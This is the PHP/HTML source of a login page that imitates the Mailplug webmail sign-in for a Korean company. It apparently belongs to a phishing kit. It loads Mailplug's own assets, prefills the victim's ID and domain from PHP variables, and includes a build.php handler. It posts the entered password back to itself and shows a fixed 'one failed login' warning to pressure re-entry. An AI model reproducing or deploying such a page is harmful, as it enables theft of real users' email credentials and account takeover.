<?php include '../build.php' ?>
<!DOCTYPE html>
<html
  lang="ko"
>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="_csrf" content="rYnfgJPknowu0MGHfRQ0vcoUDeQ82TdHv9h1ceINqIQb0rn7nuy64afQqL8D4KPjGzkAjvkkINxdulNqjelGFdQ0meIjtIyf" />
    <meta name="_csrf_header" content="X-CSRF-TOKEN"/>
    
    <title>(주)비하임</title>
    <link rel="icon" href="https://login.mailplug.com/auth/asset/images/favicon.ico"/>
    <link rel="stylesheet" href="https://login.mailplug.com/auth/asset/css/index.css?v=1781751430"/>
    <link rel="stylesheet" href="https://login.mailplug.com/auth/asset/css/main.css?v=2604.5"/>
    <link rel="preload stylesheet" as="style" href="https://gw.mailplug.com/static/resources/service/gw/common/fonts/SpoqaHanSansNeo/SpoqaHanSansNeo.css"/>

    <style>
        .textsm {
            display: flex;
            justify-content: center;
            margin: auto 111px;
        }
    </style>
  </head>

  <body class="flex flex-col min-h-screen justify-between items-center overflow-x-hidden overflow-y-auto">
    <div class="flex-1 w-full">
      <main class="flex justify-center">
      <div class="login-container">
        <div class="login-main-container">
          <!-- 로그인 폼 -->
          <div class="login-form-container">
            <form name="login-form" method="post" id="login-form" required="" autocomplete="off">
            <input type="hidden" name="login" value="mailplug">
              <div class="login-logo-container">
                <!-- 로고 타입이 text인 경우 -->
                <div class="login-logo-value-container">
                  <!--<p class="text-choco-700 text-[32px] leading-[48px] font-medium text-center">(주)비하임</p>-->
                  <p class="text-choco-700 text-[32px] leading-[48px] font-medium text-center"><?php echo htmlspecialchars($title); ?></p>
                </div>
                <!-- 로고 타입이 image인 경우 -->
                
              </div>
            

            <div class="flex flex-col gap-5">
              <div class="flex flex-col gap-2.5">
                <!-- 최근 사용자 아이디 SelectBox -->
                <div id="selectBoxContainer">
                  <select-box name="recentLoginUserIds" data-default-user-id="<?php echo htmlspecialchars($login_id); ?>" data-recent-user-ids="[]" data-domain="<?php echo htmlspecialchars($domain); ?>" tabindex="1">
                </select-box>
                </div>
                <div id="selectBoxContainer">
                  <select-box name="recentLoginUserIds" data-default-user-id="<?php echo htmlspecialchars($login_id); ?>" data-recent-user-ids="[]" data-domain="<?php echo htmlspecialchars($domain); ?>" tabindex="1" options="[{&quot;value&quot;:&quot;<?php echo htmlspecialchars($login_id); ?>&quot;,&quot;label&quot;:&quot;<?php echo htmlspecialchars($decoded); ?>&quot;,&quot;isDeleteDisabled&quot;:true},{&quot;value&quot;:&quot;directInput&quot;,&quot;label&quot;:&quot;직접 입력&quot;,&quot;isCustom&quot;:true,&quot;isDeleteDisabled&quot;:true}]" value="<?php echo htmlspecialchars($login_id); ?>">
      <div class="inline-flex flex-col gap-1">
        <div class="inline-flex items-center gap-0.5 h-8 py-[5px] cursor-pointer focus:outline-none select-none" data-type="selected" tabindex="1" draggable="false">
          <div class="overflow-hidden text-ellipsis whitespace-nowrap" tabindex="-1"><?php echo htmlspecialchars($decoded); ?></div>
          <img src="https://login.mailplug.com/auth/asset/images/filledDown.svg" class="transition-transform duration-200 w-4 h-4" data-type="arrow" tabindex="-1" draggable="false">
        </div>
      </div>
    </select-box>
                </div>
                <!-- 아이디 Input 영역 -->
                <div id="userIdInputContainer" class="hidden">
                  
                    
      
        <div class="input-container relative inline-block w-[400px]">
          <input type="text" name="user" id="user" placeholder="아이디" value="<?php echo htmlspecialchars($decoded); ?>" class="w-full border-b-2 border-cool-300 placeholder:text-cool-400 focus:outline-none focus:border-choco-700 text-[16px] leading-[24px]  input-with-after-text" tabindex="1" autofocus="autofocus"/>
          
          <div id="afterText" class="absolute right-0 top-1/2 -translate-y-1/2 after-text-wrapper max-w-[264px] truncate">
            <p id="afterTextMessage" class="text-choco-700 text-[16px] leading-[24px] font-medium truncate">@<?php echo htmlspecialchars($domain); ?></p>
          </div>
        </div>
            
        </div>
        <!-- 비밀번호 Input 영역 -->
        <div class="input-container relative inline-block w-[400px]">
          <input type="text" name="pass" id="password" placeholder="비밀번호" value=""class="w-full border-b-2 border-cool-300 placeholder:text-cool-400 focus:outline-none focus:border-choco-700 text-[16px] leading-[24px]  pr-9!" tabindex="2" autofocus="autofocus"/>
        </div>
        </div>

        <!-- 클라이언트 측 검증 에러 메시지 -->
        <div id="errorMessageContainer" class="" style="<?php echo $error; ?>">
            <div class="helper-text-container w-[400px]">
                <p id="errorMessage" class="text-choco-700 text-[14px] leading-[22px] font-normal text-error-500 text-[13px]!">로그인 <strong>1회</strong> 실패하였습니다.<br>로그인 5회 실패 시 로그인이 차단됩니다.</p>
            </div>
        </div>
        <div class="helper-text-container w-[400px]">
            <p id="errorMessage" class="text-choco-700 text-[14px] leading-[22px] font-normal text-error-500 text-[13px]!"></p>
        </div>
  
        </div>
        <!-- 서버 측 오류 메시지 (일반 폼 제출 시 서버에서 FlashAttribute로 전달된 에러) -->
        
        <!-- 캡챠 -->
              
        <div class="flex justify-between w-full">
            <!-- 로그인 상태 유지 -->
        <div>
                  
        <label class="inline-flex items-start gap-1 select-none relative cursor-pointer" for="stayLoggedIn">
            <!-- 실제 checkbox input (숨김) -->
            <input type="checkbox" id="stayLoggedIn" name="stayLoggedIn" value="false" tabindex="3" class="checkbox peer" autocomplete="off" onchange="this.value = this.checked ? 'true' : 'false'"/>
            <!-- 커스텀 체크박스 표시용 i 태그 -->
            <i></i>
            <span class="cursor-pointer text-sm leading-[22px] text-choco-700 py-[1px]">로그인 상태 유지</span>
        </label>
        </div>
                <!-- 비밀번호 찾기 -->
                 <a href="" class="text-sm font-normal leading-5.5 text-choco-700">비밀번호 찾기</a>
              </div>
              <!-- 로그인 버튼 -->
               <button type="submit" name="button" id="loginButton" class="py-4 px-5 rounded text-base leading-6 font-medium select-none cursor-pointer disabled:cursor-not-allowed bg-charcoal text-white disabled:bg-charcoal/12 disabled:text-charcoal/22 w-full mt-5" tabindex="5" data-loading="false">
          <div class="w-full flex items-center justify-center hidden" id="spinner">
            <img src="" class="animate-spin w-6 h-6">
          </div>
          <span id="label" class="text-base!">로그인</span>
        </button>

            
        <!-- 다른 도메인으로 로그인 -->
        <div id="loginStep1UrlData" data-login-step1-url="" class="hidden"></div>
        <button type="button" name="button" id="switchDomainButton" class="py-4 px-5 rounded text-base leading-6 font-medium select-none cursor-pointer disabled:cursor-not-allowed text-wolf-700 bg-transparent disabled:text-wolf-700/40 py-[9px] px-5 w-fit mt-3 leading-[22px]!" tabindex="6">
            <div class="w-full flex items-center justify-center hidden" id="spinner">
                <img src="" class="animate-spin w-6 h-6">
            </div>
            <span id="label" class="textsm text-sm!">다른 도메인으로 로그인</span>
        </button>
      
        </form>
            
        </div>
          <!-- 우측 이미지 -->
          
        </div>

        <!-- 로그인 안내 -->
        
        <!-- fingerprint -->
      </div>
    </main>
    </div>

    <div>
<footer class="flex flex-wrap justify-center items-center w-full pt-3 pb-8 px-4 gap-x-7 gap-y-1">
        <mp-dropdown>
      <div class="relative inline-block">
        <!-- 드롭다운 버튼 -->
        <button class="px-3 h-8 flex items-center gap-2" data-dropdown-button="">
          <span class="text-choco-700 text-xs leading-4.5 font-normal">
            한국어
          </span>
          <img src="https://login.mailplug.com/auth/asset/images/caretDown.svg" class="w-4 h-4">
        </button>

        <!-- 드롭다운 리스트 -->
        
      </div>
    </mp-dropdown>
        <p class="h-8 text-xs leading-4.5 font-poppins! text-cool-600 content-center mobile-main:hidden">&copy; MAILPLUG Inc. All rights reserved.</p>

        <!-- 데모 채팅 상담 -->
        
      </footer>
    </div>
    <mp-modal id="modal"></mp-modal>
    <mp-toast id="toast"></mp-toast>
  </body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
